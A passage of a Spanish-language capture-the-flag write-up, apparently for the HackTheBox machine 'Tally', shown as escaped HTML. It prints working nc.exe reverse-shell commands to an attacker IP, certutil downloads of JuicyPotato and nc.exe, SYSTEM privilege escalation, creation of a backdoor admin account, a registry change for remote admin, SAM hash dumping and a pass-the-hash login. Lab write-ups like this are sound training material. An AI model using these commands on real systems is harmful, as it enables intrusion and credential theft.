-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.27 443&quot;&lt;/span&gt;
-2&amp;gt; go
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.59] 49936
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.14393]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2016 Microsoft Corporation. All rights reserved.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;tally&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;arah
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora solo nos queda escalar privilegios, por lo que vamos a enumerar un poco el sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;arah&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
-
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name                Description                               State   
-&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a process        Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;Disabled
-
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;arah&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que tenemos el privilegio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt; habilitado, por lo que ya debemos estar pensando en un &lt;a href=&quot;https://github.com/ohpe/juicy-potato/releases/tag/v0.1&quot;&gt;&lt;strong&gt;&lt;em&gt;Juicy Potato&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;arah&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.27/JuicyPotato.exe JP.exe
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-  000000  ...
-  054e00
-CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.27/nc.exe nc.exe
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-  0000  ...
-  6e00
-CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.59 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Nov/2021 12:57:47] &lt;span class=&quot;s2&quot;&gt;&quot;GET /JuicyPotato.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.59 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Nov/2021 12:57:50] &lt;span class=&quot;s2&quot;&gt;&quot;GET /JuicyPotato.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.59 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Nov/2021 13:05:02] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.59 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Nov/2021 13:05:09] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora nos entablamos una reverse shell a nuestra máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;JP.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rivesc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.27 443&quot;&lt;/span&gt;
-JP.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rivesc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.27 443&quot;&lt;/span&gt;
-Testing &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 4444
-......
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] authresult 0
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] CreateProcessWithTokenW OK
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.59] 50135
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.14393]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2016 Microsoft Corporation. All rights reserved.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos  visualizar la flag (root.txt).&lt;/p&gt;
-
-&lt;p&gt;Otra forma que podriamos utilizar sería crearno un usuario y agregarlo al grupo &lt;strong&gt;Administrators&lt;/strong&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: A veces es necesario ejecutar el mismo comando varias veces para que aplique y el nombre de usuario no debe contener digitos).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; JP.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c net user kamiyo k4miyo123 /add&quot;&lt;/span&gt;
-
-Testing &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 4444
-......
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] authresult 0
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] CreateProcessWithTokenW OK
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; JP.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c net localgroup Administrators k4miyo /add&quot;&lt;/span&gt;
-
-Testing &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 4444
-......
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] authresult 0
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] CreateProcessWithTokenW OK
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lo podemos validar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123!'&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] TALLY&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo:k4miyo123!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que no tenemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d!&lt;/code&gt;, así que vamos a retocar un registro del sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; JP.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 4444 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c reg add HKLM&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;OFTWARE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;icrosoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentVersion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;olicies&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot;&lt;/span&gt;
-Testing &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 4444
-......
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] authresult 0
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] CreateProcessWithTokenW OK
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123!'&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] TALLY&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo:k4miyo123! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya tenemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d!&lt;/code&gt;, así que podriamos tratar de ver los hashes de los usuarios, en concreto del administrador:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123!'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--sam&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] TALLY&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo:k4miyo123! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumping SAM hashes
-SMB         10.10.10.59     445    TALLY            Administrator:500:aad3b435b51404eeaad3b435b51404ee:d904afc137554b20156f689f1b19c2b2:::
-SMB         10.10.10.59     445    TALLY            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.10.59     445    TALLY            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-^CKeyboardInterrupt
-2021-11-19T19:45:05Z
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora podemos hacer &lt;strong&gt;&lt;em&gt;pass the hash&lt;/em&gt;&lt;/strong&gt; como el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;d904afc137554b20156f689f1b19c2b2&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.59
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
